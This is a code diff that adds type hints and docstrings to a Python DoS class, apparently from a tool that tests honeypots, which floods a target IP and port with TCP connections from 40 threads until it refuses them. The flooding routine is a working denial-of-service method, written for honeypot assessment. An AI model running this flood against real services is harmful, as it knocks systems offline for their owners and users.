@@ -1,16 +1,26 @@
+import threading
 import time
 import socket
-import threading
-from .base_attack import BaseAttack
+
+from .base_attack import AttackResults, BaseAttack, BaseHoneypot
+
 
 class DoS(BaseAttack):
-    def __init__(self, honeypot):
-        super().__init__(honeypot)
-        self.honeypot_rejecting_connections = False
-
-    def attack(self):
+    def __init__(self, honeypot: BaseHoneypot) -> None:
         """
-        Attempt to flood the honeypot with connections until it starts rejecting them.
+        Initializes a new DoS object.
+
+        Args:
+            honeypot (BaseHoneypot): Honeypot object holding the information
+                                     to use in the attack.
+        """
+        super().__init__(honeypot)
+        self.honeypot_rejecting_connections: bool = False
+
+    def attack(self) -> None:
+        """
+        Attempt to flood the honeypot with connections until
+        it starts rejecting them.
         """
         while not self.honeypot_rejecting_connections:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -22,15 +32,16 @@ class DoS(BaseAttack):
             finally:
                 sock.close()
 
-    def run_attack(self, num_threads=40):
+    def run_attack(self, num_threads=40) -> AttackResults:
         """
         Launch the DoS attack using multiple threads.
         """
         print(f"Running DoS attack on {self.honeypot.ip}:{self.honeypot.port}...")
-        
-        threads = [threading.Thread(target=self.attack) for _ in range(num_threads)]
 
-        start_time = time.time()
+        threads: list[threading.Thread] = [threading.Thread(target=self.attack)
+                                           for _ in range(num_threads)]
+
+        start_time: float = time.time()
 
         for thread in threads:
             thread.start()
@@ -40,8 +51,11 @@ class DoS(BaseAttack):
 
         for thread in threads:
             thread.join()
-        
-        end_time = time.time()
-        time_taken = end_time - start_time
 
-        return True, "Vulnerability found: DoS attack made the SSH honeypot reject connections", time_taken, num_threads
+        end_time: float = time.time()
+        time_taken: float = end_time - start_time
+
+        return (True,
+                "Vulnerability found: DoS attack made the SSH honeypot reject connections",
+                time_taken,
+                num_threads)
